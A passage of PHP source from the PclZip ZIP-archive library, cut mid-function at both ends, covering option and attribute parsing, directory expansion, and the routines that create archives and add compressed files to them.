          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
